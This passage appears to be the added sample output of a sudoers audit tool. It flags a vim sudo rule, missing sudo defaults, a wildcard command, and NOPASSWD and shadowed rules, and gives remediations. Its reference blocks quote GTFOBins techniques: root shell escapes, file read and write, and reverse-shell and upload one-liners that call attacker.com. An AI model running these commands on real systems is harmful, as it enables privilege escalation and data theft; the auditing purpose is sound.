+  Command:     /usr/bin/vim /etc/nginx/nginx.conf
+  Source Line: deploy ALL=(root) /usr/bin/vim /etc/nginx/nginx.conf
+  Location:    docs/examples/policy/sudoers.d/10-deploy:4
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/vim /etc/nginx/nginx.conf' via sudo as [root], which is listed in GTFObins with the 'file-read' capability.
+GTFObins Context: Inherits file-read behavior from python, lua, vi.
+This allows to run Python code ('...').
+This allows to run Lua code ('...').
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    Defaults !sudoedit_follow, sudoedit_checkdir
+    deploy ALL = (root) sudoedit /etc/nginx/nginx.conf
+  Reference:
+    vim -c ':redir! >/path/to/output-file | echo "DATA" | redir END | q'
+    
+    # Via python (trigger with vim):
+    vim -c ':py ...'
+    # From python:
+    python -c 'print(open("/path/to/input-file").read())'
+    
+    # Via lua (trigger with vim):
+    vim -c ':lua ...'
+    # From lua:
+    lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
+    
+    # Via vi (trigger with vim):
+    vim
+    # From vi:
+    vi /path/to/input-file
+
+[HIGH] SUDO-GTFO-001: Dangerous Sudo Binary allowed: vim (file-write)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Command:     /usr/bin/vim /etc/nginx/nginx.conf
+  Source Line: deploy ALL=(root) /usr/bin/vim /etc/nginx/nginx.conf
+  Location:    docs/examples/policy/sudoers.d/10-deploy:4
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/vim /etc/nginx/nginx.conf' via sudo as [root], which is listed in GTFObins with the 'file-write' capability.
+GTFObins Context: Inherits file-write behavior from python, lua, vi.
+This allows to run Python code ('...').
+This allows to run Lua code ('...').
+Where '^[' is the escape key.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    Defaults !sudoedit_follow, sudoedit_checkdir
+    deploy ALL = (root) sudoedit /etc/nginx/nginx.conf
+  Reference:
+    # Via python (trigger with vim):
+    vim -c ':py ...'
+    # From python:
+    python -c 'open("/path/to/output-file","w+").write("DATA")'
+    
+    # Via lua (trigger with vim):
+    vim -c ':lua ...'
+    # From lua:
+    lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
+    
+    # Via vi (trigger with vim):
+    vim
+    # From vi:
+    vi /path/to/output-file
+    iDATA
+    ^[
+    w
+
+[HIGH] SUDO-GTFO-001: Dangerous Sudo Binary allowed: vim (library-load)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Command:     /usr/bin/vim /etc/nginx/nginx.conf
+  Source Line: deploy ALL=(root) /usr/bin/vim /etc/nginx/nginx.conf
+  Location:    docs/examples/policy/sudoers.d/10-deploy:4
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/vim /etc/nginx/nginx.conf' via sudo as [root], which is listed in GTFObins with the 'library-load' capability.
+GTFObins Context: Inherits library-load behavior from python.
+This allows to run Python code ('...').
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    Defaults !sudoedit_follow, sudoedit_checkdir
+    deploy ALL = (root) sudoedit /etc/nginx/nginx.conf
+  Reference:
+    # Via python (trigger with vim):
+    vim -c ':py ...'
+    # From python:
+    python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+
+[HIGH] SUDO-GTFO-001: Dangerous Sudo Binary allowed: vim (reverse-shell)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Command:     /usr/bin/vim /etc/nginx/nginx.conf
+  Source Line: deploy ALL=(root) /usr/bin/vim /etc/nginx/nginx.conf
+  Location:    docs/examples/policy/sudoers.d/10-deploy:4
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/vim /etc/nginx/nginx.conf' via sudo as [root], which is listed in GTFObins with the 'reverse-shell' capability.
+GTFObins Context: Inherits reverse-shell behavior from python, lua.
+This allows to run Python code ('...').
+This allows to run Lua code ('...').
+This requires 'lua-socket' to be available.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    Defaults !sudoedit_follow, sudoedit_checkdir
+    deploy ALL = (root) sudoedit /etc/nginx/nginx.conf
+  Reference:
+    # Via python (trigger with vim):
+    vim -c ':py ...'
+    # From python:
+    python -c 'import sys,socket,os,pty;s=socket.socket()
+    s.connect(("attacker.com",12345))
+    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+    pty.spawn("/bin/sh")'
+    
+    # Via lua (trigger with vim):
+    vim -c ':lua ...'
+    # From lua:
+    lua -e '
+      local s=require("socket");
+      local t=assert(s.tcp());
+      t:connect("attacker.com",12345);
+      while true do
+        local r,x=t:receive();local f=assert(io.popen(r,"r"));
+        local b=assert(f:read("*a"));t:send(b);
+      end;
+      f:close();t:close();'
+
+[HIGH] SUDO-GTFO-001: Dangerous Sudo Binary allowed: vim (shell)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Command:     /usr/bin/vim /etc/nginx/nginx.conf
+  Source Line: deploy ALL=(root) /usr/bin/vim /etc/nginx/nginx.conf
+  Location:    docs/examples/policy/sudoers.d/10-deploy:4
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/vim /etc/nginx/nginx.conf' via sudo as [root], which is listed in GTFObins with the 'shell' capability.
+GTFObins Context: Inherits shell behavior from python, lua, vi.
+This allows to run Python code ('...').
+This allows to run Lua code ('...').
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    Defaults !sudoedit_follow, sudoedit_checkdir
+    deploy ALL = (root) sudoedit /etc/nginx/nginx.conf
+  Reference:
+    # Via python (trigger with vim):
+    vim -c ':py ...'
+    # From python:
+    python -c 'import os; os.execl("/bin/sh", "sh")'
+    
+    # Via lua (trigger with vim):
+    vim -c ':lua ...'
+    # From lua:
+    lua -e 'os.execute("/bin/sh")'
+    
+    # Via vi (trigger with vim):
+    vim
+    # From vi:
+    vi -c ':!/bin/sh' /dev/null
+    
+    # Via vi (trigger with vim):
+    vim
+    # From vi:
+    vi -c ':shell'
+    
+    # Via vi (trigger with vim):
+    vim
+    # From vi:
+    vi -c ':set shell=/bin/sh | shell'
+    
+    # Via vi (trigger with vim):
+    vim
+    # From vi:
+    vi -c :terminal /bin/sh
+
+[HIGH] SUDO-GTFO-001: Dangerous Sudo Binary allowed: vim (upload)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Command:     /usr/bin/vim /etc/nginx/nginx.conf
+  Source Line: deploy ALL=(root) /usr/bin/vim /etc/nginx/nginx.conf
+  Location:    docs/examples/policy/sudoers.d/10-deploy:4
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/vim /etc/nginx/nginx.conf' via sudo as [root], which is listed in GTFObins with the 'upload' capability.
+GTFObins Context: Inherits upload behavior from python, lua.
+This allows to run Python code ('...').
+This allows to run Lua code ('...').
+This requires 'lua-socket' to be available.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    Defaults !sudoedit_follow, sudoedit_checkdir
+    deploy ALL = (root) sudoedit /etc/nginx/nginx.conf
+  Reference:
+    # Via python (trigger with vim):
+    vim -c ':py ...'
+    # From python:
+    python -c 'import sys
+    if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+    else: import urllib as u, urllib2 as r
+    r.urlopen("http://attacker.com", open("/path/to/input-file", "rb").read())'
+    
+    # Via python (trigger with vim):
+    vim -c ':py ...'
+    # From python:
+    python -c 'import sys
+    if sys.version_info.major == 3: import http.server as s, socketserver as ss
+    else: import SimpleHTTPServer as s, SocketServer as ss
+    ss.TCPServer(("", 12345), s.SimpleHTTPRequestHandler).serve_forever()'
+    
+    # Via lua (trigger with vim):
+    vim -c ':lua ...'
+    # From lua:
+    lua -e '
+      local f=io.open("/path/to/input-file", "rb")
+      local d=f:read("*a")
+      io.close(f);
+      local s=require("socket");
+      local t=assert(s.tcp());
+      t:connect("attacker.com",12345);
+      t:send(d);
+      t:close();'
+
+[MEDIUM] SUDO-DEF-003: Missing or Disabled use_pty
+  Location:    docs/examples/policy/sudoers:2
+  Compliance:  ANSSI-BP-028 R39, CIS-5.2.2
+  Description: The 'use_pty' flag is not enabled globally. Without a pseudo-terminal (PTY) allocation, processes run via sudo can access the invoking terminal's input buffer, enabling terminal hijacking.
+  Remediation: Add 'Defaults use_pty' globally to the sudoers file.
+  Example Fix:
+    Defaults use_pty
+
+[MEDIUM] SUDO-DEF-007: Missing or Disabled noexec
+  Location:    docs/examples/policy/sudoers:2
+  Compliance:  ANSSI-BP-028 R39
+  Description: The global 'noexec' flag is not enabled. This allows permitted commands to execute child processes (such as interactive shells or pagers) unless individually restricted.
+  Remediation: Add 'Defaults noexec' globally to the sudoers file to prevent execution of subprocesses by default.
+  Example Fix:
+    Defaults noexec
+
+[MEDIUM] SUDO-DEF-010: Missing or Disabled ignore_dot
+  Location:    docs/examples/policy/sudoers:2
+  Compliance:  ANSSI-BP-028 R39
+  Description: The global 'ignore_dot' flag is not enabled. Sudo will not ignore the current directory '.' if it is present in PATH, which could allow binary hijacking from the working directory.
+  Remediation: Add 'Defaults ignore_dot' globally to the sudoers file.
+  Example Fix:
+    Defaults ignore_dot
+
+[MEDIUM] SUDO-DEF-009: Weak umask Configuration
+  Source Line: Defaults umask=0022
+  Location:    docs/examples/policy/sudoers:5
+  Compliance:  ANSSI-BP-028 R39
+  Description: The global umask is set to a weak value '0022'. A weak umask can result in files or directories created by commands running as root being readable or writable by unprivileged users.
+  Remediation: Set 'Defaults umask=0077' in the sudoers file.
+  Example Fix:
+    Defaults umask=0077
+
+[MEDIUM] SUDO-CMD-004: Wildcard in Command Definition
+  User/Group:  ops
+  Host:        ALL
+  RunAs:       root
+  Command:     /usr/bin/cat /var/log/*
+  Source Line: ops ALL=(root) /usr/bin/cat /var/log/*
+  Location:    docs/examples/policy/sudoers.d/20-ops:4
+  Compliance:  ANSSI-BP-028 R43
+  Description: The command '/usr/bin/cat /var/log/*' allowed for user(s) [ops] contains wildcards. Arguments matching wildcards in sudoers can often be bypassed using directory traversals (e.g. '/var/log/../../etc/shadow') or option injection.
+  Remediation: Avoid wildcards in command paths. Use specific paths or write wrapper scripts that validate inputs before executing commands.
+  Example Fix:
+    ops ALL = (root) /usr/bin/cat /var/log/explicit_target
+
+[MEDIUM] SUDO-CMD-015: Shadowed or Overridden Sudoers Rule
+  User/Group:  backup
+  Host:        ALL
+  RunAs:       root
+  Tags:        NOPASSWD:
+  Command:     /usr/local/sbin/backup.sh ""
+  Source Line: backup ALL=(root) NOPASSWD: /usr/local/sbin/backup.sh ""
+  Location:    docs/examples/policy/sudoers.d/20-ops:6
+  Description: The rule at docs/examples/policy/sudoers.d/20-ops:6 for user(s) [backup] on host(s) [ALL] as [root] granting '/usr/local/sbin/backup.sh ""' shadows or overrides the earlier rule at docs/examples/policy/sudoers.d/20-ops:5 ('/usr/local/sbin/backup.sh ""'). Because sudoers evaluates matching rules using last-match-wins semantics, the later rule weakens security controls (PASSWD -> NOPASSWD).
+  Remediation: Consolidate overlapping sudoers entries so each principal, host, runas target, and command has a single unambiguous rule without unintended last-match-wins overrides.
+  Example Fix:
+    # Consolidate overlapping rules (docs/examples/policy/sudoers.d/20-ops:5 and docs/examples/policy/sudoers.d/20-ops:6) into a single explicit rule:
+    backup ALL = (root) PASSWD: NOEXEC: NOSETENV: /usr/local/sbin/backup.sh ""
+
+[LOW] SUDO-DEF-008: Missing or Disabled requiretty
+  Location:    docs/examples/policy/sudoers:2
+  Compliance:  ANSSI-BP-028 R39
+  Description: The global 'requiretty' flag is not enabled. Without it, commands can be executed from non-interactive sessions (such as background daemons or cron jobs), complicating session attribution.
+  Remediation: Add 'Defaults requiretty' globally to the sudoers file.
+  Example Fix:
+    Defaults requiretty
+
+[LOW] SUDO-DEF-017: Missing or Disabled Sudo Log File (logfile)
+  Location:    docs/examples/policy/sudoers:2
+  Compliance:  CIS-5.2.3
+  Description: The global 'logfile' option is not configured or is empty. Without a dedicated sudo log file, auditing and incident response for privileged command execution depend solely on syslog configuration.
+  Remediation: Configure a dedicated sudo log file by adding 'Defaults logfile="/var/log/sudo.log"' to the sudoers file.
+  Example Fix:
+    Defaults logfile="/var/log/sudo.log"
+
+[LOW] SUDO-CMD-005: Passwordless Specific Command Execution Allowed (NOPASSWD)
+  User/Group:  backup
+  Host:        ALL
+  RunAs:       root
+  Tags:        NOPASSWD:
+  Command:     /usr/local/sbin/backup.sh ""
+  Source Line: backup ALL=(root) NOPASSWD: /usr/local/sbin/backup.sh ""
+  Location:    docs/examples/policy/sudoers.d/20-ops:6
+  Compliance:  CIS-5.2.4
+  Description: The user(s) [backup] are permitted to run the specific command '/usr/local/sbin/backup.sh ""' as [root] without entering a password (NOPASSWD). While restricted to this binary, any command running passwordless expands the local attack surface if it has argument parsing or script vulnerabilities.
+  Remediation: Ensure that passwordless privileges are strictly necessary. If possible, require authentication or implement strict input validation inside target wrapper scripts.
+  Example Fix:
+    backup ALL = (root) PASSWD: NOEXEC: /usr/local/sbin/backup.sh ""
+
+[INFO] SUDO-CMD-013: Missing SELinux Context Elevation on Administrator Rule (TYPE/ROLE)
+  User/Group:  root
+  Host:        ALL
+  RunAs:       ALL : %ALL
+  Tags:        SETENV:
+  Source Line: root ALL=(ALL:ALL) ALL
+  Location:    docs/examples/policy/sudoers:8
+  Compliance:  DISA-STIG
+  Description: The administrator-grade rule for user(s) [root] on host(s) [ALL] running as [ALL : %ALL] does not specify the 'TYPE=' and 'ROLE=' options. Without an explicit SELinux type and role transition, commands executed via sudo run in the invoking user's SELinux context instead of the administrator domain.
+  Remediation: Add 'TYPE=sysadm_t ROLE=sysadm_r' to the administrator rule so sudo transitions to the SELinux administrator domain (DISA STIG V-272484 / RHEL-08-010455). On hosts not running SELinux this finding is informational and can be disregarded.
+  Example Fix:
+    root ALL = (ALL : %ALL) TYPE=sysadm_t ROLE=sysadm_r ALL
+
+[INFO] SUDO-CMD-013: Missing SELinux Context Elevation on Administrator Rule (TYPE/ROLE)
+  User/Group:  %wheel
+  Host:        ALL
+  RunAs:       ALL
+  Tags:        SETENV:
+  Source Line: %wheel ALL=(ALL) ALL
+  Location:    docs/examples/policy/sudoers:9
+  Compliance:  DISA-STIG
+  Description: The administrator-grade rule for user(s) [%wheel] on host(s) [ALL] running as [ALL] does not specify the 'TYPE=' and 'ROLE=' options. Without an explicit SELinux type and role transition, commands executed via sudo run in the invoking user's SELinux context instead of the administrator domain.
+  Remediation: Add 'TYPE=sysadm_t ROLE=sysadm_r' to the administrator rule so sudo transitions to the SELinux administrator domain (DISA STIG V-272484 / RHEL-08-010455). On hosts not running SELinux this finding is informational and can be disregarded.
+  Example Fix:
+    %wheel ALL = (ALL) TYPE=sysadm_t ROLE=sysadm_r ALL
+
+--- Summary of Findings ---
+  CRITICAL: 15
+  HIGH:     15
+  MEDIUM:   6
+  LOW:      3
+  INFO:     2
+
